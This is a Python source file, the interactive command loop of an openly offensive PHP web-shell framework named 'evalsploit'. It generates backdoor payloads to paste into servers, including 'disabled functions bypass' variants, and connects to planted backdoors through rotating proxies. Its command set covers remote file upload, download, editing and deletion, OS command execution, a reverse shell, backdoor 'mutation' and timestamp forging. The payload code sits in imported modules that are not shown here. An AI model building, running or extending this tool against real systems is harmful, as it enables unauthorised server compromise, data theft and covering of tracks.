"""CLI loop: session selection at startup, command dispatch."""

from __future__ import annotations

import importlib.util
from pathlib import Path

from evalsploit.config import EvalsploitConfig, project_root
from evalsploit.context import SessionContext
from evalsploit.transport.send import send, ping_with_mode, SEND_MODES, validate_proxy
from evalsploit.transport.payloads import generate_backdoor
from evalsploit.modules.registry import COMMANDS, COMMAND_HELP

# Import modules so they register
from evalsploit.modules import shell  # noqa: F401
from evalsploit.modules import file  # noqa: F401
from evalsploit.modules import config_cmds  # noqa: F401
from evalsploit.modules import run_mod  # noqa: F401
from evalsploit.modules import exploit_mod  # noqa: F401
from evalsploit.modules import scan_mod  # noqa: F401
from evalsploit.modules import reverse_mod  # noqa: F401
from evalsploit.modules import info_mod  # noqa: F401
from evalsploit.modules import php_console_mod  # noqa: F401
from evalsploit.modules import try_mod  # noqa: F401
from evalsploit.modules import ping_mod  # noqa: F401
from evalsploit.modules import config_show_mod  # noqa: F401
from evalsploit.modules import proxy_switch_mod  # noqa: F401

# Load user plugins from evalsploit/plugins/*.py
_plugins_dir = Path(__file__).resolve().parent / "plugins"
if _plugins_dir.exists():
    for _p in sorted(_plugins_dir.glob("*.py")):
        if _p.name.startswith("_"):
            continue
        try:
            _spec = importlib.util.spec_from_file_location(f"evalsploit.plugins.{_p.stem}", _p)
            if _spec and _spec.loader:
                _mod = importlib.util.module_from_spec(_spec)
                _spec.loader.exec_module(_mod)
        except Exception as _e:
            print(f"[evalsploit] Plugin {_p.name}: load failed - {_e}")

version = "3.0.0"

def show_main_menu(config: EvalsploitConfig) -> str:
    """Print startup menu and return choice: payload | session | url | last | exit."""

    print(f'''		   			                      	     
                                  ▄█                   ▄█           █▀   ▄█   	
         ▄▄▄▄  ▄▄▄▄ ▄▄▄▄  ▄▄▄▄    ██   ▄▄▄▄   ▄█ ▄▄▄   ██    ▄▄▄     ▄  ▄██▄  	
       ▄█▀▀▀▀█▌ ▀█▄  █▌  ▀▀ ▄██   ██  ▐██▀▀█▌ ███▀▀██  ██  ▄█▀▀██▄  ██   ██    
       ██▀▀▀▀▀   ▀█▄██   ▄██▀██▌  ██  ▄ ▀█▄▄  ██  ▄██  ██  ██▄▀ ██  ██   ██    
        ▀████▀    ▀██    ▀█▄▄██▀  █▀  ▀████▀  █████▀   █▀   ▀███▀   █▀   █▀    
       ▄                                      ██                           ▄ 	
        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        {version}
                                               Remote exploitation and 
                                               Disabled functions bypass  
    ''')

    print()
    print("  1. Payload   - ready payload to paste (variants: classic / bypass / simple)")
    print("  2. Session   - choose from saved connections")
    print("  3. URL       - connect by address")
    print("  4. Last      - use last connection")
    print("  5. Proxies   - configure and validate proxy list")
    print("  0. Exit")
    print()
    line = input("Choice: ").strip()
    if line == "0":
        return "exit"
    if line == "1":
        return "payload"
    if line == "2":
        return "session"
    if line == "3":
        return "url"
    if line == "4" or line == "":
        return "last"
    if line == "5":
        return "proxy"
    return "last"  # fallback


def show_payload_variants(config: EvalsploitConfig) -> None:
    """Print payload variants (classic, simple, bypass) for current Z, V."""
    Z, V = config.Z, config.V
    print()
    print(f"Request params: Z={Z}, V={V} (must match settings when connecting)")
    print("-" * 60)

    classic_list = generate_backdoor("classic", Z, V)
    print("\n[ Classic (base64) ]")
    print(classic_list[0])

    simple_list = generate_backdoor("simple", Z, V)
    print("\n[ Simple (eval) ]")
    print(simple_list[0])

    bypass_list = generate_backdoor("bypass", Z, V)
    print("\n[ Bypass - variants ]")
    for i, payload in enumerate(bypass_list, 1):
        if payload.startswith("TMP-include:") or payload.startswith("Function bypass"):
            print(payload)
        else:
            print(payload)

    print("-" * 60)
    input("Press Enter to return to menu...")


def show_proxy_menu(config: EvalsploitConfig) -> None:
    """Submenu: load proxies, validate, list, enable/disable, choose mode."""
    while True:
        print()
        print("  --- Proxies ---")
        print("  1. Load from file")
        print("  2. Validate all")
        print("  3. List proxies")
        print("  4. Enable proxy (choose by index or random)")
        print("  5. Disable proxy")
        print("  0. Back")
        print()
        line = input("Choice: ").strip()
        if line == "0":
            return
        if line == "1":
            path_in = input("Path to file (host:port per line): ").strip()
            if not path_in:
                continue
            path = Path(path_in)
            if not path.is_absolute():
                path = project_root() / path_in
            if not path.exists():
                print("File not found.")
                continue
            lines = []
            for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
                s = raw.strip()
                if s and not s.startswith("#") and ":" in s:
                    lines.append(s)
                elif s and not s.startswith("#") and ":" not in s:
                    print(f"  Skip (no ':'): {s[:50]!r}")
            config.proxy_list = lines
            config.save_global()
            print(f"Loaded proxies: {len(config.proxy_list)}")
        elif line == "2":
            if not config.proxy_list:
                print("List empty. Load from file first.")
                continue
            test_url = config.url if config.url else None
            config.proxy_validated = []
            for i, px in enumerate(config.proxy_list):
                ok = validate_proxy(px, test_url=test_url, timeout=10)
                if ok:
                    config.proxy_validated.append(i)
            print(f"Checked {len(config.proxy_list)}, valid: {len(config.proxy_validated)}")
        elif line == "3":
            if not config.proxy_list:
                print("List empty.")
                continue
            validated_set = set(config.proxy_validated)
            for i, px in enumerate(config.proxy_list):
                if i in validated_set:
                    status = "OK"
                elif not config.proxy_validated:
                    status = "-"
                else:
                    status = "-"
                print(f"  {i + 1}. {px}  [{status}]")
        elif line == "4":
            if not config.proxy_list:
                print("List empty. Load from file first.")
                continue
            config.proxy_enabled = True
            mode_in = input("Mode: 1 - random (default), 2 - by index. Enter = random: ").strip() or "1"
            if mode_in == "2":
                num_in = input("Proxy number (1..{}): ".format(len(config.proxy_list))).strip()
                try:
                    n = int(num_in)
                    if 1 <= n <= len(config.proxy_list):
                        config.proxy_use_index = n - 1
                        print(f"Proxy #{n}: {config.proxy_list[n - 1]}")
                    else:
                        config.proxy_use_index = None
                        print("Invalid number, random mode enabled.")
                except ValueError:
                    config.proxy_use_index = None
                    print("Random mode enabled.")
            else:
                config.proxy_use_index = None
                print("Mode: random (one per session).")
            config.clear_proxy_session_cache()
            config.save_global()
        elif line == "5":
            config.proxy_enabled = False
            config.clear_proxy_session_cache()
            config.save_global()
            print("Proxies disabled.")


def _create_context(config: EvalsploitConfig) -> SessionContext:
    """Create SessionContext and set initial pwd (skipped when config.silent)."""
    ctx = SessionContext(config, send)
    if not config.silent:
        try:
            out = ctx.send("echo __DIR__;")
            pwd = out.strip()
            if pwd == "/tmp":
                pwd = ctx.send("echo getcwd();").strip()
            ctx.pwd = pwd or "/"
        except Exception:
            ctx.pwd = "/"
    return ctx


def run_startup(config: EvalsploitConfig) -> SessionContext | None:
    """Startup menu loop: payload / session / url / last / exit. Return context or None."""
    config.load_global()
    sessions = config.list_sessions()

    while True:
        choice = show_main_menu(config)

        if choice == "exit":
            return None

        if choice == "payload":
            show_payload_variants(config)
            continue

        if choice == "session":
            if not sessions:
                print("No saved sessions.")
                continue
            print("Saved sessions:")
            for i, name in enumerate(sessions, 1):
                print(f"  {i}. {name}")
            line = input("Number or session name: ").strip()
            if line.isdigit():
                idx = int(line)
                if 1 <= idx <= len(sessions):
                    config.load_session(sessions[idx - 1])
                    print(f"Loaded session: {sessions[idx - 1]}")
                else:
                    print("Invalid number.")
                    continue
            elif line in sessions:
                config.load_session(line)
                print(f"Loaded session: {line}")
            else:
                print("Session not found.")
                continue

        if choice == "url":
            url = input("URL: ").strip()
            if not url:
                print("URL not specified.")
                continue
            config.url = url
            z_in = input("Z (Enter = keep current): ").strip()
            if z_in:
                config.Z = z_in
            v_in = input("V (Enter = keep current): ").strip()
            if v_in:
                config.V = v_in

        if choice == "last":
            if not config.url:
                print("No saved URL. Choose session or enter URL.")
                continue
            print(f"Using: {config.url}")

        if choice == "proxy":
            show_proxy_menu(config)
            continue

        if choice in ("session", "url", "last") and config.url:
            return _create_context(config)


def run_loop(ctx: SessionContext) -> str:
    """Main command loop. Returns 'exit' to quit program, 'menu' to return to startup menu."""
    exit_reason = "exit"
    while True:
        try:
            line = input("evalsploit> ").strip()
        except EOFError:
            break
        if not line:
            continue
        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "exit":
            try:
                ans = input("Quit the program? [y/N] ").strip().lower()
            except EOFError:
                ans = ""
            if ans in ("y", "yes"):
                break
            continue
        if cmd == "menu":
            try:
                ans = input("Return to main menu? Current session will end. [y/N] ").strip().lower()
            except EOFError:
                ans = ""
            if ans in ("y", "yes"):
                exit_reason = "menu"
                break
            continue
        if cmd == "help":
            if args.strip():
                c = args.strip().lower().split()[0]
                if c in COMMANDS or c in HELP_TEXTS:
                    desc, usage = COMMAND_HELP.get(c, HELP_TEXTS.get(c, ("-", c)))
                    print(f"  {c}")
                    print(f"    {desc}")
                    print(f"    Use: {usage}")
                else:
                    print(f"Unknown command: {c}. Type help for full list.")
            else:
                print_help()
            continue

        mod_cls = COMMANDS.get(cmd)
        if mod_cls is None:
            print(f"Unknown command: {cmd}. Type help.")
            continue
        try:
            mod_cls().run(ctx, args)
        except Exception as e:
            print(f"Error: {e}")

    return exit_reason


HELP_TEXTS = {
    "cat": ("View file contents", "cat <path>"),
    "cd": ("Change directory", "cd <path>"),
    "config": ("Show current settings (url, Z, V, send, run_shell, etc.)", "config"),
    "connect": ("Connect by URL (interactive)", "connect"),
    "cp": ("Copy file", "cp <from> : <to>"),
    "create": ("Create empty file", "create <path>"),
    "detect": ("Check available execution variants (currently only run)", "detect run"),
    "del": ("Delete file", "del <path>"),
    "dl": ("Download from server", "download <remote_path> [ : <local_path>]"),
    "download": ("Download from server", "download <remote_path> [ : <local_path>]"),
    "edit": ("Edit file on server", "edit <path>"),
    "exit": ("Exit console (with confirmation)", "exit"),
    "exploit": ("Run exploit from exploits directory", "exploit [args]"),
    "gen": ("Generate payloads for current Z, V", "gen"),
    "generate": ("Generate payloads for current Z, V", "gen"),
    "get": ("Download from server", "download <remote_path> [ : <local_path>]"),
    "help": ("Command help", "help"),
    "home": ("Go to server home directory", "home"),
    "info": ("Server info (PHP, OS, path, user, etc.)", "info"),
    "ls": ("List files (ls or dir - set ls)", "ls [path]"),
    "md": ("Create directory", "mkdir <path>"),
    "mkdir": ("Create directory", "mkdir <path>"),
    "mkd": ("Create directory", "mkdir <path>"),
    "mkf": ("Create empty file", "create <path>"),
    "mutate": ("Mutate backdoor on server (new Z, V, PHP 8)", "mutate"),
    "mv": ("Rename/move file or directory", "ren <old> : <new>"),
    "php": ("PHP console: enter code, send to server (exit to quit)", "php  (then enter lines, exit to quit)"),
    "pwd": ("Current working directory", "pwd"),
    "put": ("Upload file to server", "upload <local_path> [ : <remote_path>]"),
    "ren": ("Rename/move file or directory", "ren <old> : <new>"),
    "reverse": ("Reverse shell (ivan/monkey - set reverse)", "reverse <host:port>"),
    "rm": ("Delete file", "rm <path>"),
    "run": ("Shell console (exec/shell_exec/... - set run)", "run  (then OS commands, exit to quit)"),
    "save": ("Save current connection as session", "save <name>"),
    "saved": ("Show saved session name", "saved"),
    "scan": ("Scan directories (report/)", "scan [path]"),
    "sessions": ("List saved sessions", "sessions"),
    "set": ("Settings: run, ls, cat, send, silent, reverse, confirm, proxy (0|1|show|switch)", "set <module> <value|help>"),
    "stat": ("File/directory info", "stat <path>"),
    "touch": ("Touch file / create empty. Date: YYYY-MM-DD HH:MM:SS after settime", "touch <path> [settime YYYY-MM-DD HH:MM:SS]"),
    "try": ("Check available execution variants (currently only run)", "try run"),
    "upload": ("Upload file to server", "upload <local_path> [ : <remote_path>]"),
    "upl": ("Upload file to server", "upload <local_path> [ : <remote_path>]"),
    "ping": ("Connectivity check: send echo 1;, measure response time", "ping"),
    "check": ("Same as ping - connectivity and latency", "check"),
    "proxy_switch": ("Switch current proxy (random or by index)", "proxy_switch [N|random]"),
    "menu": ("Return to main menu (session ends; confirmation prompted)", "menu"),
}


def print_help() -> None:
    all_cmds = sorted(set(COMMANDS.keys()) | {"menu"})
    print("Commands:", ", ".join(all_cmds), "| help | exit")
    print()
    for cmd in all_cmds:
        desc, usage = COMMAND_HELP.get(cmd, HELP_TEXTS.get(cmd, ("-", cmd)))
        print(f"  {cmd}")
        print(f"    {desc}")
        print(f"    Use: {usage}")
        print()


def _ping_on_connect(ctx: SessionContext) -> None:
    """Try ping with current send_mode, then other modes; set and save working mode."""
    config = ctx.config
    order = [config.send_mode] + [m for m in SEND_MODES if m != config.send_mode]
    for mode in order:
        ok, ms = ping_with_mode(ctx, mode)
        if ok:
            config.send_mode = mode
            config.save_global()
            print(f"Backdoor OK ({ms} ms), send: {mode}")
            return
    print("Backdoor unreachable (tried bypass, classic, simple)")


def main() -> None:
    config = EvalsploitConfig()
    while True:
        ctx = run_startup(config)
        if ctx is None:
            return
        config.save_global()
        if not config.silent:
            _ping_on_connect(ctx)
            print(f"Active directory: {ctx.pwd}")
        print()
        result = run_loop(ctx)
        if result == "exit":
            return
        # result == "menu" - loop again, show startup menu


if __name__ == "__main__":
    main()
